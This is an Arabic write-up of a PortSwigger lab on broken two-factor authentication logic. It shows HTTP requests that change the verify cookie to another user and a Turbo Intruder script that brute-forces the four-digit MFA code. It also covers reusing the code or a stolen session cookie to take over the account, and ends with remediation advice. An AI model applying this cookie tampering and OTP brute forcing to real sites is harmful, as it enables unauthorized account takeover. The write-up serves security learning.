# [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)

## **`الهدف`**
الدخول لحساب `carlos` مع عدم امتلاك أيًا من: `الـ Password, Email, MFA`.
## **`خطوات الحل`**
لحل هذا اللاب يجب اعتراضا الـ `requset` اثناء الدخول بحساب `wiener:peter`

```http
GET /login2 HTTP/2
Host: 0a9f00c304fa741d80b69e36008f007f.web-security-academy.net
Cookie: verify=wiener; session=KOMCxGSmbIYGN0LQy2p2UVkf77cqzx4U
```

الثغرة في هذا اللاب أنه يتم الاعتماد على الاسم فقط لارسال`request` الدخول لصفحة `MFA` ولذلك نقوم بحذف الـ `session` المؤقتة ونغير الـ `cookie` إلى `carlos`
```http
GET /login2 HTTP/2
Host: 0a9f00c304fa741d80b69e36008f007f.web-security-academy.net
Cookie: verify=carlos
```

وبعد ذلك سنجد أنفسنا في صفحة `MFA` لنقوم بكتابة أي رقم عشوائي فى خانة الـ `MFA` في هذا الـ `request`
```http
POST /login2 HTTP/2
Host: 0a9f00c304fa741d80b69e36008f007f.web-security-academy.net
Cookie: verify=wiener; session=KOMCxGSmbIYGN0LQy2p2UVkf77cqzx4U

mfa-code=0000
```

ونغير الـ `cookie` إلى `carlos`، والـ `0000` إلى `%s (الفراغ / Placeholder القياسي لأداة Turbo Intruder)`، وسنبقى هذا الـ `request` مُعترضًا داخل `Burp Suite` دون تمرير لأننا سنحتاجه في إحدى طرق الحل.
```http
POST /login2 HTTP/2
Host: 0a9f00c304fa741d80b69e36008f007f.web-security-academy.net
Cookie: verify=carlos

mfa-code=%s
```

ثم نقوم بعمل `Brute Force` على خانة `mfa-code` من `0000` لـ `9999`

ولنتخلص من بطئ الـ `Burp Suite` المجاني سنستعمل أداة `Turbo Intruder` المجانية.
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10, 
                           # السرعة (عدد الطلبات بالتوازي) - نقللها لو السيرفر هنج
                           requestsPerConnection=100,
                           pipeline=False,           
                           #نجعلها True إذا كان السيرفر قوي ويستحمل ضغط عالي
                           engine=Engine.THREADED
                           )

    # 1. نطاق التخمين: نغير الـ 10000 حسب عدد الاحتمالات 
    for i in range(10000):
        # 2. التنسيق: نغير الرقم '4' حسب طول الكود (مثلاً 6 لو الكود مكون من 6 أرقام)
        code = '{:04d}'.format(i)
        engine.queue(target.req, code)

def handleResponse(req, interesting):
    # 3. الفلتر: غير الـ 302 حسب الـ Status الناجحة اللي مستنيها من السيرفر (مثلاً 200 أو 302)
    if req.status == 302:
        table.add(req) # يطبع الطلب الناجح في الجدول تحت
    
```

وبمجرد الحصول على الـ `MFA` الصحيح نعود لـ `Burp Suite` ونكتب هذا الكود في الـ `request` الذي أبقيناه مُعترضًا سابقًا (يجب التأكد من أن الريكوست المتجه للسيرفر قد تم تعديل الـ `Cookie` فيه إلى `carlos`) وبمجرد تمرير الـ `request` والعودة للمتصفح سنجد أننا قد دخلنا إلى حساب `carlos` بنجاح ثم نضغط على `My account` لننتهي من حل اللاب.

**`إن طريقة الحل السابقة توضح أن هناك ثغرة غير مقصودة في إعدادت هذا اللاب`**، 
وتسمى `MFA/OTP Replay Vulnerability` حيث أنه لم يكن من المفترض أن يعمل الكود مرة أخرى، حيث أن أداة `Turbo Intruder` قد قامت بالفعل باستخدام هذا الـ `MFA` وأظهرت الـ `response` وكان موجود بداخله الـ `session` الدائم للحساب.

وهناك طريقة حل أخرى وهي عن طريق نسخ `session` حساب `carlos` في `response` الـ `request` الناجح في أداة `Turbo Intruder` ثم نذهب إلى المتصفح وندخل إلى حساب `wiener:peter` ونقوم بإكمال الـ `MFA` حتى ندخل بشكل كامل إلى الحساب وبعد ذلك نضغط على `F12` ثم نذهب إلى خانة `Application` ونضغط على `cookies` من القائمة الجانبية ونقوم بتعديل الـ cookies الخاصة بنا بحذف الاسم وتعديل رقم الـ `session` إلى الرقم الذي قُمنا بنسخه ونضغط `Enter` ثم نضغط `My account` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب عدم الاعتماد على قيمة الـ `cookies` في الطلب الوارد من صفحة `MFA`، بل إنه يجب بمجرد تسجيل الدخول بالإسم والباسورد أن يقوم السيرفر بتوليد الـ `session` المؤقتة (قيمة عشوائية من الصعب تخمينها) وكما أن لها صلاحية لمدة قصيرة فقط لاتمام عملية الـ `(MFA)` ويعتمد عليها فقط وهذا سيُفشل محاولات المُهاجم إن حاول تغيير قيمة الـ `session` المؤقتة في الـ request،كما أنه يجب تفعيل خاصية حرق / إلغاء كود الـ `MFA` بعد أول استخدام `(Burn on First Use)` فلا يُمكن استعماله مرة أخرى كما فعلنا في طريقة الحل الأولى، ويجب وضع حماية ضد كثرة الطلبات لأن الوضع الحالي للموقع هو `No Rate Limiting.`
